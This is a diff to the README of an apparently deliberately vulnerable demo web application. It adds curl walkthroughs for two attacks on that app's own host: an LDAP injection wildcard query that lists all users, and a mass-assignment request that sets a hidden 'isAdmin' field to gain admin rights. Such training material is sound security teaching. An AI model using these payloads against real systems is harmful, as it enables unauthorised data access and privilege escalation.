@@ -331,6 +331,22 @@ Full configuration & usage examples can be found in our [demo project](https://g
 - **HTTP Method fuzzer** - The server supports uploading, deletion, and getting the content of a file via /put.raw addition to the URL. The actual implementation using a regular upload endpoint of the server and the /put.raw endpoint is mapped in Nginx.
 
 - **LDAP Injection** - The login request returns an LDAP query for the user's profile, which can be used as a query parameter in /api/users/ldap _query_ query parameter. The returned query can be modified to search for other users. If the structure of the LDAP query is changed, a detailed LDAP error will be returned (with LDAP server information and hierarchy).
+  <details>
+    <summary>LDAP Injection Example Exploitation</summary>
+
+  ```bash
+  curl "https://brokencrystals.com/api/users/ldap?query=%28%26%28objectClass%3Dperson%29%28objectClass%3Duser%29%28email%3D%2A%29%29"
+  ```
+
+  This is a URI-encoded version of the following query:
+
+  ```text
+  https://brokencrystals.com/api/users/ldap?query=(&(objectClass=person)(objectClass=user)(email=*))
+  ```
+
+  The query retrieves information about all users with an email address, using the wildcard `*` to match any email. This demonstrates how the endpoint can be exploited to extract sensitive information from the LDAP directory.
+
+  </details>
 
 - **Local File Inclusion (LFI)** - The /api/files endpoint returns any file on the server from the path that is provided in the _path_ param. The UI uses this endpoint to load crystal images on the landing page.
 
@@ -386,6 +402,67 @@ Full configuration & usage examples can be found in our [demo project](https://g
       </details>
 
 - **Mass Assignment** - You can add to user admin privileges upon creating user or updating userdata. When you are creating a new user /api/users/basic you can use additional hidden field in body request { ... "isAdmin" : true }. If you are trying to edit userdata with PUT request /api/users/one/{email}/info you can add this additional field mentioned above. For checking admin permissions there is one more endpoint: /api/users/one/{email}/adminpermission.
+  <details>
+    <summary>Hidden Field Exploitation for Privilege Escalation</summary>
+      1. Creating a Regular User
+
+      ```bash
+      curl 'https://brokencrystals.com/api/users/basic' -X POST \
+        -H 'Content-Type: application/json' \
+        --data-raw '{"email":"regular_user","firstName":"John","lastName":"Doe","company":"Test","cardNumber":"123","phoneNumber":"555-1234","password":"password123","op":"basic"}'
+      ```
+
+      2. Login as Regular User
+
+      ```bash
+      curl 'https://brokencrystals.com/api/auth/login' -X POST \
+        -H 'Content-Type: application/json' \
+        --data-raw '{"user":"regular_user","password":"password123","op":"basic"}'
+      ```
+
+      The response will contain an authorization token:
+
+      ```
+      {"auth-token":"eyJ0eXAiOiJKV1QiLCJhbGci..."}
+      ```
+
+      3. Verify No Admin Permissions for Regular User
+
+      ```bash
+      curl 'https://brokencrystals.com/api/users/one/regular_user/adminpermission' \
+        -H 'authorization: eyJ0eXAiOiJKV1QiLCJhbGci...'
+      ```
+
+      Response returns `false`, indicating no admin permissions.
+
+      4. Creating a User with Admin Privileges (Exploiting the Vulnerability)
+
+      ```bash
+      curl 'https://brokencrystals.com/api/users/basic' -X POST \
+        -H 'Content-Type: application/json' \
+        --data-raw '{"isAdmin":true,"email":"admin_user","firstName":"Admin","lastName":"User","company":"Test","cardNumber":"123","phoneNumber":"555-5678","password":"password123","op":"basic"}'
+      ```
+
+      5. Login as Admin User
+
+      ```bash
+      curl 'https://brokencrystals.com/api/auth/login' -X POST \
+        -H 'Content-Type: application/json' \
+        --data-raw '{"user":"admin_user","password":"password123","op":"basic"}'
+      ```
+
+      This will return another authorization token for the admin user.
+
+      6. Verify Admin Permissions for the Admin User
+
+      ```bash
+      curl 'https://brokencrystals.com/api/users/one/admin_user/adminpermission' \
+        -H 'authorization: eyJ0eXAiOiJKV1QiLCJhbGci...'
+      ```
+
+      Response returns `true`, confirming admin permissions have been granted.
+
+  </details>
 
 - **Open Database** - The index.html file includes a link to manifest URL, which returns the server's configuration, including a DB connection string.
     <details>
